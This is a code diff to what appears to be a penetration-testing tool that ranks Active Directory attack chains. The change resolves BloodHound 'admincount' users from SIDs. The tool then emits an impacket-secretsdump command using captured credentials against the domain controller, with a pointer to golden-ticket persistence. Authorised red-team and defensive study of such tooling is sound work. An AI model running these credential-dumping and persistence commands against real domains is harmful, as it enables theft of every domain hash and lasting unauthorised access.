@@ -627,9 +627,28 @@ def run(report, store, ui=None):
     # a user BloodHound flagged 'admincount' (Domain Admin candidate).
     # Emit BEFORE R-GOLDEN so the operator sees the trivial win first:
     # they already have Administrator-tier credentials.
-    admincount_users = {ev.user.lower() for ev in store.items
-                        if ev.kind == "user" and ev.fact == "admincount"
-                        and ev.user}
+    # iter-46: also count users whose admincount Evidence came from group
+    # membership (SID-based; resolve to name via store.resolve_sid).
+    admincount_users = set()
+    admincount_via = {}   # user -> group name (for context in the summary)
+    for ev in store.items:
+        if ev.kind != "user" or ev.fact != "admincount":
+            continue
+        u = (ev.user or "").strip()
+        if not u:
+            continue
+        # If Evidence.user is a SID (starts with S-), resolve to name.
+        if u.startswith("S-1-"):
+            resolved = store.resolve_sid(u)
+            if resolved:
+                u = resolved
+            else:
+                continue
+        u_low = u.lower()
+        admincount_users.add(u_low)
+        via = (ev.meta or {}).get("via_group", "")
+        if via and u_low not in admincount_via:
+            admincount_via[u_low] = via
     if admincount_users:
         seen_ac = set()
         for (ulc, pw), occurrences in e.creds.items():
@@ -642,12 +661,13 @@ def run(report, store, ui=None):
                     best_src, best_line = _s, _l
                     break
             _dom_ac = store.dominant_domain() or "<dom>"
+            via = admincount_via.get(ulc, "")
+            via_note = f" via '{via}'" if via else " (admincount=1)"
             chains.append(Chain("R-ADMIN-CRED", "already-DA cred",
-                f"{ulc}:{pw} - BloodHound says admincount (Domain Admin candidate)",
+                f"{ulc}:{pw} - tier-0 candidate{via_note}",
                 crit=10, conf=0.95, ready=1.5, prox=1.0,         # score 14.25
                 commands=[
-                    f"# BloodHound admincount=1 means {ulc} was recently in a "
-                    f"tier-0 group (DA/EA/BA/Schema/etc.)",
+                    f"# BloodHound flags {ulc} as tier-0{via_note}",
                     f"impacket-secretsdump '{_dom_ac}/{ulc}:{pw}'@<DC-IP>",
                     f"# if that works you have every domain hash - proceed to "
                     f"R-GOLDEN for persistence",
